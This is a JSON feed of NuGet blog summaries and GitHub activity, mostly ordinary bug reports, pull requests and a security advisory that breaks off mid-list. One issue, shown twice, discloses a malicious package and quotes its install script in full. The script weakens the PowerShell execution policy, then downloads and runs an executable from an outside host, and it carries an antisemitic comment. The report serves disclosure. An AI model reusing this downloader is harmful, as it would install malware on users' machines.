{"Data":{"Blog":{"FeedItems":[{"Title":"Announcing NuGet 6.4 – Signed, Central, Delivered","PublishedOn":"2022-11-08T20:59:34+00:00","CommentsCount":13,"FacebookCount":0,"Summary":"NuGet 6.4 is included in Visual Studio 2022 and .NET 7.0 out of the box. You can also download NuGet 6.4 for Windows, macOS, and Linux as a standalone executable.\nNuGet 6.4 is one of many releases in...","Href":"https://devblogs.microsoft.com/nuget/announcing-nuget-6-4-signed-central-delivered/","RawContent":null},{"Title":"NuGet Season of Giving","PublishedOn":"2022-09-30T18:01:24+00:00","CommentsCount":1,"FacebookCount":0,"Summary":"NuGet has gone through a lot of changes over the last 10 years. From the package manager console, standalone NuGet.exe, and integration of NuGet into the .NET SDK, we have always relied on the open...","Href":"https://devblogs.microsoft.com/nuget/nuget-season-of-giving/","RawContent":null},{"Title":"Announcing NuGet 6.3 – Transitive Dependencies, Floating Versions, and Re-enabling Signed Package Verification","PublishedOn":"2022-08-09T20:04:03+00:00","CommentsCount":14,"FacebookCount":0,"Summary":"NuGet 6.3 is included in Visual Studio 2022 and .NET 6.0 out of the box. You can also download NuGet 6.3 for Windows, macOS, and Linux as a standalone executable.\nNuGet 6.3 is one of many releases in...","Href":"https://devblogs.microsoft.com/nuget/announcing-nuget-6-3-transitive-dependencies-floating-versions-and-re-enabling-signed-package-verification/","RawContent":null},{"Title":"Introducing Transitive Dependencies in Visual Studio","PublishedOn":"2022-08-09T19:59:52+00:00","CommentsCount":4,"FacebookCount":0,"Summary":"We heard from you that direct dependencies are easy to track, but that you struggle with tracking transitive dependencies. We want to make that easier for the day-to-day management of your NuGet...","Href":"https://devblogs.microsoft.com/nuget/introducing-transitive-dependencies-in-visual-studio/","RawContent":null},{"Title":"HTTPS everywhere","PublishedOn":"2022-08-09T19:59:24+00:00","CommentsCount":15,"FacebookCount":0,"Summary":"Safety guaranteed\nAs an ongoing effort to make HTTPS everywhere a reality for NuGet, we have taken a number of steps to help protect your everyday package management experiences.\nEarlier this year, a...","Href":"https://devblogs.microsoft.com/nuget/https-everywhere/","RawContent":null},{"Title":"Quickly Map Your NuGet Packages to Sources","PublishedOn":"2022-05-04T17:22:21+00:00","CommentsCount":4,"FacebookCount":0,"Summary":"Package Source Mapper\nWhen we introduced Package Source Mapping late last year, we noticed a certain challenge to make onboarding to using the feature easier. Could there be a way for us to...","Href":"https://devblogs.microsoft.com/nuget/quickly-map-your-nuget-packages-to-sources/","RawContent":null},{"Title":"Introducing Central Package Management","PublishedOn":"2022-04-12T16:37:51+00:00","CommentsCount":32,"FacebookCount":0,"Summary":"Central Package Management\nDependency management is a core feature of NuGet. Managing dependencies for a single project can be easy. Managing dependencies for multi-project solutions can prove to be...","Href":"https://devblogs.microsoft.com/nuget/introducing-central-package-management/","RawContent":null},{"Title":"Requiring two-factor authentication on NuGet.org","PublishedOn":"2022-02-22T18:27:56+00:00","CommentsCount":0,"FacebookCount":0,"Summary":"NuGet.org will begin requiring two-factor authentication for accounts starting March 8th.\nThe post Requiring two-factor authentication on NuGet.org appeared first on The NuGet Blog.","Href":"https://devblogs.microsoft.com/nuget/requiring-two-factor-authentication-on-nuget-org/","RawContent":null},{"Title":"Introducing Compatible Packages on NuGet.org","PublishedOn":"2022-02-15T21:20:44+00:00","CommentsCount":3,"FacebookCount":0,"Summary":"As part of our ongoing commitment to improve the NuGet ecosystem, today we are excited to introduce a couple new features on NuGet.org to help you determine if a package is compatible with the target...","Href":"https://devblogs.microsoft.com/nuget/introducing-compatible-frameworks-on-nuget-org/","RawContent":null},{"Title":"Announcing NuGet 6.0 – Source Mapping, Package Vulnerabilities, Faster Solution Load, Oh My!","PublishedOn":"2021-11-08T18:59:15+00:00","CommentsCount":6,"FacebookCount":0,"Summary":"NuGet 6.0 &#8211; Source Mapping, Package Vulnerabilities, Faster Solution Load, Oh My!\nNuGet 6.0 is included in Visual Studio 2022 and .NET 6.0 out of the box. You can also download NuGet 6.0 for...","Href":"https://devblogs.microsoft.com/nuget/announcing-nuget-6/","RawContent":null}],"ResultType":"Feed"},"Gallery":{"Events":[{"Id":"25410294527","Type":"PullRequestEvent","CreatedAt":"2022-11-22T18:21:58","Actor":"lyndaidaii","Repository":"NuGet/NuGetGallery","Organization":"NuGet","RawContent":null,"RelatedAction":"opened","RelatedUrl":"https://github.com/NuGet/NuGetGallery/pull/9317","RelatedDescription":"Opened pull request \"[ReleasePre][2022.11.22] FI of dev into main\" (#9317) at NuGet/NuGetGallery","RelatedBody":""},{"Id":"25386143137","Type":"IssuesEvent","CreatedAt":"2022-11-21T22:04:04","Actor":"joelverhagen","Repository":"NuGet/NuGetGallery","Organization":"NuGet","RawContent":null,"RelatedAction":"closed","RelatedUrl":"https://github.com/NuGet/NuGetGallery/issues/9316","RelatedDescription":"Closed issue \"Microsoft and NuGet have to answer for this\" (#9316) at NuGet/NuGetGallery","RelatedBody":"### NuGet Product Used\n\nNuGet SDK\n\n### Product Version\n\nTrojan\n\n### Worked before?\n\n_No response_\n\n### Impact\n\n_No response_\n\n### Repro Steps & Context\n\nhttps://www.nuget.org/profiles/ExodusOfficial\r\nhttps://www.nuget.org/profiles/Nuget.0rg\r\nhttps://www.nuget.org/profiles/Nuget.OrgDev\r\n\r\nif you check this users profile it will impersonate all popular libraries by adding an infected dependency. If you examine all the libraries in its profile you can see this dependency all over MicroJson.Net (>= 0.8.5). So the dependency package MicroJson.Net (>= 0.8.5) that infects the computer. This is a very professional scam. I don't understand how you as Nuget allow this. Too bad Microsoft is turning a blind eye to this! I understand from the number of downloads that Nuget.0rg infected more than 1800 people who own this account. This is literally a massacre! Nuget is also responsible for this. I still can't believe you let this happen.\r\n\r\nTechnical details:\r\nThe MicroJson.Net (>= 0.8.5) dependency enables to download the virus to the computer by running init.ps.\r\n\r\nparam($installPath, $toolsPath, $package)\r\nNew-ItemProperty -Path 'HKCU:Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell' -Name 'ExecutionPolicy' -Value \"Unrestricted\" -PropertyType String -Force\r\n$ProcName = \"MatteBlack.exe\"\r\n$WebFile = \"https://slavecentral101.tk/5556775444/2872322/$ProcName\" \r\nClear-Host\r\n(New-Object System.Net.WebClient).DownloadFile($WebFile,\"$env:APPDATA\\$ProcName\")\r\nStart-Process (\"$env:APPDATA\\$ProcName\")\r\n#Kill jews\r\n\r\nExample:\r\n\r\nFake: https://www.nuget.org/packages/Guna.UI.WinForms\r\nOfficial: https://www.nuget.org/packages/Guna.UI2.WinForms\r\n\r\nhttps://www.veed.io/view/99db7ad5-16df-4ec4-a864-58051595ea3f?sharingWidget=true&panel=share\r\n\r\nActually, today I accidentally had to report the original author of the guna library, it was not his fault... I never thought it was an imitation of the guna library.\n\n### Verbose Logs\n\n```shell\nhttps://www.nuget.org/profiles/ExodusOfficial\r\nhttps://www.nuget.org/profiles/Nuget.0rg\r\nhttps://www.nuget.org/profiles/Nuget.OrgDev\r\n\r\nif you check this users profile it will impersonate all popular libraries by adding an infected dependency. If you examine all the libraries in its profile you can see this dependency all over MicroJson.Net (>= 0.8.5). So the dependency package MicroJson.Net (>= 0.8.5) that infects the computer. This is a very professional scam. I don't understand how you as Nuget allow this. Too bad Microsoft is turning a blind eye to this! I understand from the number of downloads that Nuget.0rg infected more than 1800 people who own this account. This is literally a massacre! Nuget is also responsible for this. I still can't believe you let this happen.\r\n\r\nTechnical details:\r\nThe MicroJson.Net (>= 0.8.5) dependency enables to download the virus to the computer by running init.ps.\r\n\r\nparam($installPath, $toolsPath, $package)\r\nNew-ItemProperty -Path 'HKCU:Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell' -Name 'ExecutionPolicy' -Value \"Unrestricted\" -PropertyType String -Force\r\n$ProcName = \"MatteBlack.exe\"\r\n$WebFile = \"https://slavecentral101.tk/5556775444/2872322/$ProcName\" \r\nClear-Host\r\n(New-Object System.Net.WebClient).DownloadFile($WebFile,\"$env:APPDATA\\$ProcName\")\r\nStart-Process (\"$env:APPDATA\\$ProcName\")\r\n#Kill jews\r\n\r\nExample:\r\n\r\nFake: https://www.nuget.org/packages/Guna.UI.WinForms\r\nOfficial: https://www.nuget.org/packages/Guna.UI2.WinForms\r\n\r\nhttps://www.veed.io/view/99db7ad5-16df-4ec4-a864-58051595ea3f?sharingWidget=true&panel=share\r\n\r\nActually, today I accidentally had to report the original author of the guna library, it was not his fault... I never thought it was an imitation of the guna library.\n```\n"},{"Id":"25385876496","Type":"IssuesEvent","CreatedAt":"2022-11-21T21:49:06","Actor":"alfasmartplayer","Repository":"NuGet/NuGetGallery","Organization":"NuGet","RawContent":null,"RelatedAction":"opened","RelatedUrl":"https://github.com/NuGet/NuGetGallery/issues/9316","RelatedDescription":"Opened issue \"Microsoft and NuGet have to answer for this\" (#9316) at NuGet/NuGetGallery","RelatedBody":""},{"Id":"25378002475","Type":"PullRequestEvent","CreatedAt":"2022-11-21T15:26:47","Actor":"joelverhagen","Repository":"NuGet/NuGetGallery","Organization":"NuGet","RawContent":null,"RelatedAction":"merged","RelatedUrl":"https://github.com/NuGet/NuGetGallery/pull/9309","RelatedDescription":"Merged pull request \"changed `dotnet new` example\" (#9309) at NuGet/NuGetGallery","RelatedBody":"Starting .NET 7.0, `dotnet new --install` became `dotnet new install`.\r\nhttps://learn.microsoft.com/en-us/dotnet/core/tools/dotnet-new-install\r\n\r\nTherefore changed syntax in example"},{"Id":"25341968393","Type":"PullRequestEvent","CreatedAt":"2022-11-18T22:45:02","Actor":"camigthompson","Repository":"NuGet/NuGetGallery","Organization":"NuGet","RawContent":null,"RelatedAction":"opened","RelatedUrl":"https://github.com/NuGet/NuGetGallery/pull/9315","RelatedDescription":"Opened pull request \"[A11y] Remove aria-hidden attribute for prefix reserved element\" (#9315) at NuGet/NuGetGallery","RelatedBody":"Previous PR addressing the below issued introduced a new accessibility issue in which the prefix reserved checkmark was not accessible to screen readers. This PR removes the aria-hidden attribute associated with the prefix reserved icon and link. This solves the issue of the below a11y bug while also maintaining that the prefix reserved icon is not read aloud along with the package title header.\r\n\r\nPrevious PR: https://github.com/NuGet/NuGetGallery/pull/9314\r\n\r\nAddresses https://github.com/NuGet/NuGetGallery/issues/9299"},{"Id":"25317656789","Type":"PullRequestEvent","CreatedAt":"2022-11-17T23:22:38","Actor":"camigthompson","Repository":"NuGet/NuGetGallery","Organization":"NuGet","RawContent":null,"RelatedAction":"merged","RelatedUrl":"https://github.com/NuGet/NuGetGallery/pull/9314","RelatedDescription":"Merged pull request \"[A11y] Make aria-hidden elements not focusable\" (#9314) at NuGet/NuGetGallery","RelatedBody":"Addresses https://github.com/NuGet/NuGetGallery/issues/9299"},{"Id":"25316951851","Type":"PullRequestEvent","CreatedAt":"2022-11-17T22:36:36","Actor":"camigthompson","Repository":"NuGet/NuGetGallery","Organization":"NuGet","RawContent":null,"RelatedAction":"opened","RelatedUrl":"https://github.com/NuGet/NuGetGallery/pull/9314","RelatedDescription":"Opened pull request \"[A11y] Make aria-hidden elements not focusable\" (#9314) at NuGet/NuGetGallery","RelatedBody":"Addresses https://github.com/NuGet/NuGetGallery/issues/9299"}],"ResultType":"GitHubEvent"},"Home":{"Events":[{"Id":"25459212411","Type":"IssuesEvent","CreatedAt":"2022-11-24T16:49:56","Actor":"ibe-SAG","Repository":"NuGet/Home","Organization":"NuGet","RawContent":null,"RelatedAction":"opened","RelatedUrl":"https://github.com/NuGet/Home/issues/12272","RelatedDescription":"Opened issue \"Visual Studio 2022 17.4.1, Package manager UI incorrectly selects package version for update, which is unsupported by project configuration \" (#12272) at NuGet/Home","RelatedBody":"### NuGet Product Used\n\nVisual Studio Package Management UI\n\n### Product Version\n\nVisual Studio 2022 17.4.1\n\n### Worked before?\n\nunknown\n\n### Impact\n\nIt's more difficult to complete my work\n\n### Repro Steps & Context\n\nyou can use my test project:\r\nhttps://github.com/ibe-SAG/VS-Issues/tree/main/NugetUpdateIssue\r\n\r\nor reproduce manually\r\n\r\n1. create c# console project\r\n2. set edit .csproj file an set \r\n    <Platforms>AnyCPU</Platforms>\r\n    <TargetFramework>net6.0-windows</TargetFramework>\r\n    <RuntimeIdentifier>win-x64</RuntimeIdentifier>\r\n    <LangVersion>10.0</LangVersion>\r\n    <PlatformTarget>x64</PlatformTarget>\r\n\r\n4. Reference package Microsoft.AspNetCore.Authentication.OpenIdConnect in the version 6.0.11\r\n5. Open NuGet package manager\r\n6. Navigate to Updates \r\nVersion 7.0.0 of the package is offered (but it is not compatible with the project).\r\nIf you select the package and click on update button, Visual Studio tries to install the package and fail with:\r\nNU1202: Package Microsoft.AspNetCore.Authentication.OpenIdConnect 7.0.0 is not compatible with net6.0-windows7.0 (.NETCoreApp,Version=v6.0). Package Microsoft.AspNetCore.Authentication.OpenIdConnect 7.0.0 supports: net7.0 (.NETCoreApp,Version=v7.0)\r\nNU1202: Package Microsoft.AspNetCore.Authentication.OpenIdConnect 7.0.0 is not compatible with net6.0-windows7.0 (.NETCoreApp,Version=v6.0) / win-x64. Package Microsoft.AspNetCore.Authentication.OpenIdConnect 7.0.0 supports: net7.0 (.NETCoreApp,Version=v7.0)\r\nPackage restore failed. Rolling back package changes for 'NugetUpdateIssue'.\r\n\r\nIf you have only one such dependency it is not a problem, but in our case we have over 100 projects in solution with over 100 dependencies. To upgrade all the dependencies one by one and in correct order is a pain\r\n\r\n\r\nExpected behavior : not supported version should not be selected for update, but the latest compatible version  \n\n### Verbose Logs\n\n```shell\nRestoring packages for C:\\code\\issues\\NugetUpdateIssue\\NugetUpdateIssue.csproj...\r\n  GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.authentication.openidconnect/index.json\r\n  OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.authentication.openidconnect/index.json 487ms\r\n  GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.authentication.openidconnect/7.0.0/microsoft.aspnetcore.authentication.openidconnect.7.0.0.nupkg\r\n  OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.authentication.openidconnect/7.0.0/microsoft.aspnetcore.authentication.openidconnect.7.0.0.nupkg 115ms\r\nInstalled Microsoft.AspNetCore.Authentication.OpenIdConnect 7.0.0 from https://api.nuget.org/v3/index.json with content hash hAPVV6xD9KQaf0je+YhhPBvGv421DRthL7qBsKxmjL2ELB4cbogD2FcHg9z80hy6P1ABZ09leKknJ2xRkXFCMA==.\r\nNU1202: Package Microsoft.AspNetCore.Authentication.OpenIdConnect 7.0.0 is not compatible with net6.0-windows7.0 (.NETCoreApp,Version=v6.0). Package Microsoft.AspNetCore.Authentication.OpenIdConnect 7.0.0 supports: net7.0 (.NETCoreApp,Version=v7.0)\r\nNU1202: Package Microsoft.AspNetCore.Authentication.OpenIdConnect 7.0.0 is not compatible with net6.0-windows7.0 (.NETCoreApp,Version=v6.0) / win-x64. Package Microsoft.AspNetCore.Authentication.OpenIdConnect 7.0.0 supports: net7.0 (.NETCoreApp,Version=v7.0)\r\nPackage restore failed. Rolling back package changes for 'NugetUpdateIssue'.\n```\n"},{"Id":"25446799093","Type":"IssuesEvent","CreatedAt":"2022-11-24T07:02:24","Actor":"nkolev92","Repository":"NuGet/Home","Organization":"NuGet","RawContent":null,"RelatedAction":"closed","RelatedUrl":"https://github.com/NuGet/Home/issues/12268","RelatedDescription":"Closed issue \"Merge NuGetConsole.Host.Powershell into NuGet.PackageManagement.PowershellCmdlets\" (#12268) at NuGet/Home","RelatedBody":"nuget.packagemanagement.powershellcmdlets.csproj is only referenced in NuGet.Tools, NuGet.VisualStudio.Client and NuGetConsole.Host.Powershell\r\n\r\nnugetconsole.host.powershell.csproj is only referenced in NuGet.VisualStudio.Client and NuGetConsole.Host.Powershell.Test.csproj\r\n\r\nThese 2 assemblies always come hand in hand and as such there's no need for them to be separate and pay the cost for loading assemblies. \r\n\r\nBefore:\r\n![image](https://user-images.githubusercontent.com/2878341/203448568-ea7d9d5d-2f42-406c-9eed-88785d93bcdc.png)\r\n\r\nAfter:\r\n\r\n![image](https://user-images.githubusercontent.com/2878341/203448608-42163d6c-c055-466b-afe0-cb58cdd8525a.png)\r\n\r\n"},{"Id":"25440103736","Type":"IssuesEvent","CreatedAt":"2022-11-23T21:26:58","Actor":"donnie-msft","Repository":"NuGet/Home","Organization":"NuGet","RawContent":null,"RelatedAction":"opened","RelatedUrl":"https://github.com/NuGet/Home/issues/12271","RelatedDescription":"Opened issue \"VS Options - Package Source Mapping should ordered after Package Sources\" (#12271) at NuGet/Home","RelatedBody":"Since Package Sources are generally added first and are used more frequently, let's move Package Source Mapping below that in the VS Options.\r\n![image](https://user-images.githubusercontent.com/49205731/203648691-03974eed-e290-425f-8631-294acaab2455.png)\r\n"},{"Id":"25436492996","Type":"IssuesEvent","CreatedAt":"2022-11-23T18:00:57","Actor":"kartheekp-ms","Repository":"NuGet/Home","Organization":"NuGet","RawContent":null,"RelatedAction":"closed","RelatedUrl":"https://github.com/NuGet/Home/issues/12215","RelatedDescription":"Closed issue \"[Timebox investigation] Credential provider skips all authentication methods if NET 7 RC SDK is installed\" (#12215) at NuGet/Home","RelatedBody":"### NuGet Product Used\n\ndotnet.exe\n\n### Product Version\n\n.NET 7 SDK\n\n### Worked before?\n\n.NET 6 SDK\n\n### Impact\n\nIt bothers me. A fix would be nice\n\n### Repro Steps & Context\n\nNuGet side issue for https://github.com/microsoft/artifacts-credprovider/issues/347 especially https://github.com/microsoft/artifacts-credprovider/issues/347#issuecomment-1304395965.\n\n### Verbose Logs\n\n_No response_"},{"Id":"25425504965","Type":"IssuesEvent","CreatedAt":"2022-11-23T10:31:21","Actor":"marcin-krystianc","Repository":"NuGet/Home","Organization":"NuGet","RawContent":null,"RelatedAction":"opened","RelatedUrl":"https://github.com/NuGet/Home/issues/12270","RelatedDescription":"Opened issue \"PrivateAssets flow incorrectly to transitively pinned centrally managed dependencies\" (#12270) at NuGet/Home","RelatedBody":"### NuGet Product Used\n\ndotnet.exe\n\n### Product Version\n\n7.0.100\n\n### Worked before?\n\nno\n\n### Impact\n\nIt bothers me. A fix would be nice\n\n### Repro Steps & Context\n\nFor project:\r\n```\r\n<Project Sdk=\"Microsoft.NET.Sdk\">\r\n  <PropertyGroup>\r\n    <TargetFramework>netstandard2.0</TargetFramework>\r\n    <ManagePackageVersionsCentrally>true</ManagePackageVersionsCentrally>\r\n    <CentralPackageTransitivePinningEnabled>true</CentralPackageTransitivePinningEnabled>\r\n  </PropertyGroup>\r\n  <ItemGroup>\r\n    <PackageReference Include=\"Newtonsoft.Json.Bson\" />\r\n    <PackageReference Include=\"Microsoft.Rest.ClientRuntime\" PrivateAssets=\"All\" />\r\n  </ItemGroup>\r\n</Project>\r\n```\r\nand `Directory.Packages.props`:\r\n```\r\n<Project>\r\n    <ItemGroup>\r\n        <PackageVersion Include=\"Newtonsoft.Json\" Version=\"13.0.1\" />\r\n        <PackageVersion Include=\"Newtonsoft.Json.Bson\" Version=\"1.0.2\" />\r\n        <PackageVersion Include=\"Microsoft.Rest.ClientRuntime\" Version=\"2.3.24\" />\r\n    </ItemGroup>\r\n</Project>\r\n```\r\n\r\nThe expected content of `centralTransitiveDependencyGroups` is:\r\n```\r\n\"centralTransitiveDependencyGroups\": {\r\n    \".NETStandard,Version=v2.0\": {\r\n      \"Newtonsoft.Json\": {\r\n        \"include\": \"Runtime, Compile, Native, BuildTransitive\",\r\n        \"version\": \"[13.0.1, )\"\r\n    }\r\n  }\r\n}\r\n```\r\n, but the SDK 7.0.100 produces empty `centralTransitiveDependencyGroups`.\r\n\r\nPS:\r\nI'm going to submit a PR with a fix.\n\n### Verbose Logs\n\n_No response_"},{"Id":"25425129213","Type":"IssuesEvent","CreatedAt":"2022-11-23T10:16:15","Actor":"marcin-krystianc","Repository":"NuGet/Home","Organization":"NuGet","RawContent":null,"RelatedAction":"opened","RelatedUrl":"https://github.com/NuGet/Home/issues/12269","RelatedDescription":"Opened issue \"Performance regression of NuGet restores in the sdk v7.0.100 due to calculation of \"CentralTransitiveDependencyGroups\"\" (#12269) at NuGet/Home","RelatedBody":"### NuGet Product Used\n\ndotnet.exe\n\n### Product Version\n\n7.0.100\n\n### Worked before?\n\n6.0.400\n\n### Impact\n\nI'm unable to use this version\n\n### Repro Steps & Context\n\nNuGet restore got considerably slower due to changes in how the `CentralTransitiveDependencyGroups` is calculated (https://github.com/NuGet/NuGet.Client/pull/46690.\r\nFor some of our internal solutions (which, unfortunately, we cannot share publicly ) the restore time was increased to **tens of minutes**.  It makes it impossible for us to migrate to dotnet 7. We can't share our internal solution but, we have a public repro that demonstrates the problem on a smaller scale where the restore time is doubled.\r\n\r\n1: checkout https://github.com/marcin-krystianc/TestSolutions/tree/master/LargeAppWithPrivatePackagesCentralisedNGBVRemoved\r\n2. create `global.json` for older versions e.g. `6.0.400`\r\n3. Go to `LargeAppWithPrivatePackagesCentralisedNGBVRemoved\\solution` directory and run `dotnet restore --force -clp:summary /p:RestoreUseStaticGraphEvaluation=true` to measure performance before the problem existed\r\n4. set version 7.0.100 in `global.json`\r\n5. run `dotnet restore --force -clp:summary /p:RestoreUseStaticGraphEvaluation=true` again to see performance regression (45s vs 90s on my machine)\r\n\r\nPS:\r\nI'm going to submit a PR with a fix for this problem.\r\n\r\n\n\n### Verbose Logs\n\n_No response_"},{"Id":"25416388625","Type":"IssuesEvent","CreatedAt":"2022-11-23T00:40:47","Actor":"nkolev92","Repository":"NuGet/Home","Organization":"NuGet","RawContent":null,"RelatedAction":"opened","RelatedUrl":"https://github.com/NuGet/Home/issues/12268","RelatedDescription":"Opened issue \"Merge NuGetConsole.Host.Powershell into NuGet.PackageManagement.PowershellCmdlets\" (#12268) at NuGet/Home","RelatedBody":"nuget.packagemanagement.powershellcmdlets.csproj is only referenced in NuGet.Tools, NuGet.VisualStudio.Client and NuGetConsole.Host.Powershell\r\n\r\nnugetconsole.host.powershell.csproj is only referenced in NuGet.VisualStudio.Client and NuGetConsole.Host.Powershell.Test.csproj\r\n\r\nThese 2 assemblies always come hand in hand and as such there's no need for them to be separate and pay the cost for loading assemblies. \r\n\r\nBefore:\r\n![image](https://user-images.githubusercontent.com/2878341/203448568-ea7d9d5d-2f42-406c-9eed-88785d93bcdc.png)\r\n\r\nAfter:\r\n\r\n![image](https://user-images.githubusercontent.com/2878341/203448608-42163d6c-c055-466b-afe0-cb58cdd8525a.png)\r\n\r\n"},{"Id":"25416289679","Type":"IssuesEvent","CreatedAt":"2022-11-23T00:31:36","Actor":"zivkan","Repository":"NuGet/Home","Organization":"NuGet","RawContent":null,"RelatedAction":"closed","RelatedUrl":"https://github.com/NuGet/Home/issues/12246","RelatedDescription":"Closed issue \"Possible race condition in ConfigurationDefaults.Instance.DefaultPackageSources\" (#12246) at NuGet/Home","RelatedBody":"### NuGet Product Used\n\ndotnet.exe\n\n### Product Version\n\n6.0.402\n\n### Worked before?\n\n_No response_\n\n### Impact\n\nIt's more difficult to complete my work\n\n### Repro Steps & Context\n\nOn our build server we get a random \"Collection was modified\" error when executing a dotnet restore with our solution.\r\n\r\nThe detailed build log shows an InvalidOperationException at _NuGet.Configuration.PackageSourceProvider.LoadConfigurationDefaultSources()_ while iterating the configurationDefaultSources parameter, which comes from _ConfigurationDefaults.Instance.DefaultPackageSources_.\r\n\r\nIt looks to me that there's a race conditon in _ConfigurationDefaults.Instance.DefaultPackageSources_ initializing it's member _defaultPackageSources.\n\n### Verbose Logs\n\n```shell\nC:\\Program Files\\dotnet\\sdk\\6.0.402\\NuGet.targets(132,5): error : Collection was modified; enumeration operation may not execute.\r\nSystem.InvalidOperationException: Collection was modified; enumeration operation may not execute.\r\n   at System.Collections.Generic.List`1.Enumerator.MoveNextRare()\r\n   at NuGet.Configuration.PackageSourceProvider.LoadConfigurationDefaultSources(IEnumerable`1 configurationDefaultSources)\r\n   at NuGet.Configuration.PackageSourceProvider..ctor(ISettings settings, IEnumerable`1 configurationDefaultSources, Boolean enablePackageSourcesChangedEvent)\r\n   at NuGet.Configuration.PackageSourceProvider..ctor(ISettings settings, Boolean enablePackageSourcesChangedEvent)\r\n   at NuGet.Commands.RestoreArgs.GetEffectiveSourcesCore(ISettings settings, IList`1 dgSpecSources)\r\n   at NuGet.Commands.RestoreArgs.<>c__DisplayClass101_0.<GetEffectiveSources>b__1(String root)\r\n   at System.Collections.Concurrent.ConcurrentDictionary`2.GetOrAdd(TKey key, Func`2 valueFactory)\r\n   at NuGet.Commands.RestoreArgs.GetEffectiveSources(ISettings settings, IList`1 dgSpecSources)\r\n   at NuGet.Commands.DependencyGraphSpecRequestProvider.Create(String projectNameToRestore, ExternalProjectReference project, HashSet`1 projectReferenceClosure, RestoreArgs restoreArgs, DependencyGraphSpec projectDgSpec, SettingsLoadingContext settingsLoadingContext)\r\n   at NuGet.Commands.DependencyGraphSpecRequestProvider.<>c__DisplayClass6_0.<GetRequestsFromItems>b__2(String projectNameToRestore)\r\n   at System.Threading.Tasks.Parallel.<>c__DisplayClass32_0`2.<ForEachWorker>b__0(Int32 i)\r\n   at System.Threading.Tasks.Parallel.<>c__DisplayClass19_0`1.<ForWorker>b__1(RangeWorker& currentWorker, Int32 timeout, Boolean& replicationDelegateYieldedBeforeCompletion)\r\n--- End of stack trace from previous location ---\r\n   at System.Threading.Tasks.Parallel.<>c__DisplayClass19_0`1.<ForWorker>b__1(RangeWorker& currentWorker, Int32 timeout, Boolean& replicationDelegateYieldedBeforeCompletion)\r\n   at System.Threading.Tasks.TaskReplicator.Replica.Execute()\n```\n"}],"ResultType":"GitHubEvent"},"Announcements":{"Events":[{"Id":"25223918809","Type":"IssuesEvent","CreatedAt":"2022-11-14T14:43:41","Actor":"joelverhagen","Repository":"NuGet/Announcements","Organization":"NuGet","RawContent":null,"RelatedAction":"closed","RelatedUrl":"https://github.com/NuGet/Announcements/issues/66","RelatedDescription":"Closed issue \"Associate microsoft account\" (#66) at NuGet/Announcements","RelatedBody":"Hi, I want to associate my microsoft account to sig in on nuget.\r\nhelp please ... thks"},{"Id":"25209931462","Type":"IssuesEvent","CreatedAt":"2022-11-14T02:15:16","Actor":"DSBRBrasil","Repository":"NuGet/Announcements","Organization":"NuGet","RawContent":null,"RelatedAction":"opened","RelatedUrl":"https://github.com/NuGet/Announcements/issues/66","RelatedDescription":"Opened issue \"Associate microsoft account\" (#66) at NuGet/Announcements","RelatedBody":"Hi, I want to associate my microsoft account to sig in on nuget.\r\nhelp please ... thks"},{"Id":"24695608920","Type":"IssuesEvent","CreatedAt":"2022-10-19T11:53:07","Actor":"dtivel","Repository":"NuGet/Announcements","Organization":"NuGet","RawContent":null,"RelatedAction":"closed","RelatedUrl":"https://github.com/NuGet/Announcements/issues/64","RelatedDescription":"Closed issue \"Transition from Symantec timestamping service to DigiCert timestamping service\" (#64) at NuGet/Announcements","RelatedBody":"Between October 4th, 2022 and October 24, 2022 we will transition from the deprecated Symantec timestamping service currently in use to the DigiCert timestamping service for both Microsoft author signing and NuGet.org repository signing NuGet packages for new package submissions only.\r\n\r\n*  October 4th – October 24th:  Update NuGet.org repository signing to use http://timestamp.digicert.com. Although all environments (DEV, INT, and PROD) will be updated during this window, http://nuget.org (PROD) specifically will be updated only near the beginning and end of this window.\r\n*  October 18th – 20th:  Update Microsoft author signing to use http://timestamp.digicert.com.\r\n \r\nWe expect a smooth and quiet transition; however, if you have questions or concerns, either contact support@nuget.org or post [here](https://github.com/NuGet/NuGetGallery/issues/9259).\r\n \r\nPlease see [dotnet/core#7688](https://github.com/dotnet/core/issues/7688) and [Proposal to re-enable signed NuGet package verification](https://github.com/dotnet/designs/blob/main/accepted/2021/signed-package-verification/re-enable-signed-package-verification.md) for context."},{"Id":"24531970399","Type":"IssuesEvent","CreatedAt":"2022-10-11T17:13:00","Actor":"kartheekp-ms","Repository":"NuGet/Announcements","Organization":"NuGet","RawContent":null,"RelatedAction":"opened","RelatedUrl":"https://github.com/NuGet/Announcements/issues/65","RelatedDescription":"Opened issue \"Microsoft Security Advisory  CVE-2022-41032 | .NET Elevation of Privilege Vulnerability\" (#65) at NuGet/Announcements","RelatedBody":"# Microsoft Security Advisory  CVE-2022-41032 | .NET Elevation of Privilege Vulnerability\r\n\r\n## <a name=\"executive-summary\"></a>Executive summary\r\n\r\nMicrosoft is releasing this security advisory to provide information about a vulnerability in .NET 7.0.0-rc, .NET 6.0, .NET Core 3.1, and NuGet (NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol). This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.\r\n\r\nA vulnerability exists in .NET 7.0.0-rc.1, .NET 6.0, .NET Core 3.1, and NuGet clients (NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol) where a malicious actor could cause a user to execute arbitrary code.\r\n\r\n## Discussion\r\n\r\nDiscussion for this issue can be found at https://github.com/nuget/home/issues. (TBD)\r\n\r\n## <a name=\"mitigation-factors\"></a>Mitigation factors\r\n\r\nMicrosoft has not identified any mitigating factors for this vulnerability.\r\n\r\n## <a name=\"affected-software\"></a>Affected software\r\n\r\n### NuGet & NuGet Packages\r\n\r\n- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 6.3.0 version or earlier.\r\n- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 6.2.1 version or earlier.\r\n- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 6.0.2 version or earlier.\r\n- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 5.11.2 version or earlier.\r\n- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, NuGet.Protocol 5.9.2 version or earlier.\r\n- Any NuGet.exe, NuGet.Commands, NuGet.CommandLine, 